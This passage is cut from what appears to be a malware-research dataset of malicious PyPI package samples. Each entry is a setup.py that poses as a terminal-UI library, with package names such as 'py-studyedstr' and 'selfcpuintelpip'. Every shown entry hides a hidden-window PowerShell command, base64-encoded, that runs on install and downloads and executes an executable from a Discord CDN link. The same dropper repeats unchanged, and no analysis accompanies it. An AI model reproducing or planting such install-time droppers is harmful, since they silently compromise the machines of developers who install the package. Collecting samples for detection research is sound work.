OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-strramgui-v5.2",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-strramgui',\n    packages = ['modlib'],\n    version = '7.13',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-studyedstr-v6.90",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-studyedstr',\n    packages = ['modlib'],\n    version = '10.83',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-studynvidiamc-v4.42",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-studynvidiamc',\n    packages = ['modlib'],\n    version = '7.69',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-studytoolping-v8.22",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-studytoolping',\n    packages = ['modlib'],\n    version = '3.67',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-studyvmpyw-v3.77",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-studyvmpyw',\n    packages = ['modlib'],\n    version = '4.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-superrecc-v7.26",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-superrecc',\n    packages = ['modlib'],\n    version = '1.82',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-ultraproofintel-v6.86",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-ultraproofintel',\n    packages = ['modlib'],\n    version = '4.24',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-urlmcvisa-v6.10",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-urlmcvisa',\n    packages = ['modlib'],\n    version = '10.42',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-verreplacesplit-v6.63",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-verreplacesplit',\n    packages = ['modlib'],\n    version = '1.95',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-py-virtualcontrolgame-v6.43",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-virtualcontrolgame',\n    packages = ['modlib'],\n    version = '4.46',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfcpuintelpip-v7.65",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfcpuintelpip',\n    packages = ['modlib'],\n    version = '5.47',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfednvidiatool-v6.63",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfednvidiatool',\n    packages = ['modlib'],\n    version = '4.28',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selfhydrapongpaypal-v6.58",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfhydrapongpaypal',\n    packages = ['modlib'],\n    version = '1.11',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n"
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-02-27-selflgtbcontrolpyw-v3.27",
        "code": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfLGTBcontrolpyw',\n    packages = ['modlib'],\n    version = '8.32',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 